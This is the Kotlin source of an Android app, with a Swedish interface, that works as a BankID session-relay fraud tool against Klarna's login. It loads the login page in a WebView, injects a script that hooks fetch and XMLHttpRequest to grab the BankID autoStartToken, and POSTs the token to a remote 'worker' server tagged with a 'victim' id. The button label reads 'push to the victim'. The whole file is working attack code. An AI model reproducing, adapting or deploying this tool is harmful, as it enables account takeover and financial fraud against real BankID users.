package se.ditt.relay

import android.annotation.SuppressLint
import android.os.Bundle
import android.view.ViewGroup.LayoutParams.MATCH_PARENT
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    private lateinit var web: WebView
    private lateinit var api: EditText
    private lateinit var victim: EditText
    private lateinit var service: EditText
    private lateinit var push: Button
    private var token: String? = null

    private val prefs by lazy { getSharedPreferences("relay", MODE_PRIVATE) }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)

        api = EditText(this).apply { hint = "worker-adress" }
        victim = EditText(this).apply { hint = "offer-id" }
        service = EditText(this).apply { hint = "tjänstens namn" }
        push = Button(this).apply {
            text = "Pusha till offret"
            isEnabled = false
            setOnClickListener { send() }
        }
        web = WebView(this)

        api.setText(prefs.getString("api", BuildConfig.WORKER_URL))
        victim.setText(prefs.getString("victim", ""))
        service.setText(prefs.getString("service", "Tjänsten"))

        val top = LinearLayout(this).apply { orientation = LinearLayout.HORIZONTAL }
        top.addView(api, LinearLayout.LayoutParams(0, WRAP_CONTENT, 1.5f))
        top.addView(victim, LinearLayout.LayoutParams(0, WRAP_CONTENT, 1f))

        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        root.addView(top, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        root.addView(service, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        root.addView(push, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        root.addView(web, LinearLayout.LayoutParams(MATCH_PARENT, 0, 1f))
        setContentView(root)

        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.userAgentString =
            web.settings.userAgentString.replace("; wv", "")
        CookieManager.getInstance().setAcceptThirdPartyCookies(web, true)

        web.addJavascriptInterface(Bridge(), "relay")
        web.webViewClient = object : WebViewClient() {

            override fun onPageFinished(v: WebView, url: String) {
                v.evaluateJavascript(HOOK, null)
            }

            override fun shouldOverrideUrlLoading(
                v: WebView, r: WebResourceRequest
            ): Boolean = r.url.scheme == "bankid"
        }

        web.loadUrl(START)
    }

    inner class Bridge {
        @JavascriptInterface
        fun onToken(t: String) {
            token = t
            runOnUiThread {
                push.isEnabled = true
                push.text = "Pusha till offret  ✓"
            }
        }
    }

    private fun send() {
        val t = token ?: return
        val base = api.text.toString().trim().trimEnd('/')
        val id = victim.text.toString().trim()
        val svc = service.text.toString().ifBlank { "Tjänsten" }

        prefs.edit()
            .putString("api", base)
            .putString("victim", id)
            .putString("service", svc)
            .apply()

        push.isEnabled = false
        push.text = "Skickar…"

        Thread {
            try {
                val body = JSONObject()
                    .put("state", "ready")
                    .put("service", svc)
                    .put("token", t)
                    .toString()

                val c = URL("$base/push/$id")
                    .openConnection() as HttpURLConnection
                c.requestMethod = "POST"
                c.doOutput = true
                c.setRequestProperty("Content-Type", "application/json")
                c.outputStream.use { it.write(body.toByteArray()) }
                c.responseCode

                runOnUiThread {
                    push.text = "Pushat ✓  $svc"
                    token = null
                }
            } catch (e: Exception) {
                runOnUiThread {
                    push.text = "Fel: " + e.message
                    push.isEnabled = true
                }
            }
        }.start()
    }

    companion object {
        private const val START = "https://www.klarna.com/se/logga-in"

        private const val HOOK = """
(function () {
  function scan(txt) {
    var m = txt.match(/"autoStartToken"\s*:\s*"([^"]+)"/);
    if (m) window.relay.onToken(m[1]);
  }
  var of = window.fetch;
  window.fetch = function () {
    return of.apply(this, arguments).then(function (r) {
      r.clone().text().then(scan);
      return r;
    });
  };
  var os = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function () {
    var self = this;
    self.addEventListener("load", function () { scan(self.responseText); });
    return os.apply(self, arguments);
  };
})();
"""
    }
}
